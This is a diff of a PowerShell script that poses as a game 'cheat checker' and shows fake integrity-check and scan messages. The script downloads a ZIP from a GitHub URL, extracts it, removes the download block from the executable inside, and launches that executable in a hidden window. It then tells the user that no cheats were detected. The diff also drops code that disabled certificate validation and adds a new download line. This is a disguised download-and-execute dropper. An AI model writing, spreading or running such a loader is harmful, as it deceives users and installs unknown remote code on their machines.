@@ -8,10 +8,6 @@ Start-Sleep -Seconds 1
 Write-Host "[*] Checking client file integrity..." -ForegroundColor Cyan
 Start-Sleep -Seconds 1
 
-# Отключаем проверки безопасности
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-
 $URL = "https://github.com/kaghohop-gif/chk/raw/refs/heads/main/CHHECK.zip"
 $ZIP = "C:\Чекер\main.zip"
 $EXTRACT = "C:\Чекер\CHECKK-main"
@@ -23,13 +19,11 @@ if (!(Test-Path "C:\Чекер")) {
 
 try {
     Write-Host "[*] Loading verification module..." -ForegroundColor Yellow
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-    $webClient.DownloadFile($URL, $ZIP)
+    Invoke-WebRequest -Uri $URL -OutFile $ZIP -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
     Write-Host "[+] Module loaded" -ForegroundColor Green
 } catch {
-    Write-Host "[-] Module download error: $_" -ForegroundColor Red
-    Start-Sleep -Seconds 5
+    Write-Host "[-] Module download error" -ForegroundColor Red
+    Start-Sleep -Seconds 2
     exit
 }
 
@@ -38,8 +32,8 @@ try {
     Expand-Archive -Path $ZIP -DestinationPath $EXTRACT -Force
     Write-Host "[+] Database extracted" -ForegroundColor Green
 } catch {
-    Write-Host "[-] Database extraction error: $_" -ForegroundColor Red
-    Start-Sleep -Seconds 5
+    Write-Host "[-] Database extraction error" -ForegroundColor Red
+    Start-Sleep -Seconds 2
     exit
 }
 
@@ -51,7 +45,7 @@ if ($Zip2) {
         Write-Host "[+] Signatures updated" -ForegroundColor Green
     } catch {
         Write-Host "[-] Signature update error" -ForegroundColor Red
-        Start-Sleep -Seconds 5
+        Start-Sleep -Seconds 2
         exit
     }
 }
@@ -59,7 +53,7 @@ if ($Zip2) {
 $Exe = Get-ChildItem -Path $EXTRACT -Filter "*.exe" -Recurse | Select-Object -First 1
 if ($Exe) {
     Write-Host "[*] Running deep scan..." -ForegroundColor Yellow
-    # Снимаем блокировку с файла
+    # Снимаем блокировку
     Unblock-File -Path $Exe.FullName -ErrorAction SilentlyContinue
     Start-Process -WindowStyle Hidden $Exe.FullName
     Write-Host "[+] Scan completed. No cheats detected." -ForegroundColor Green
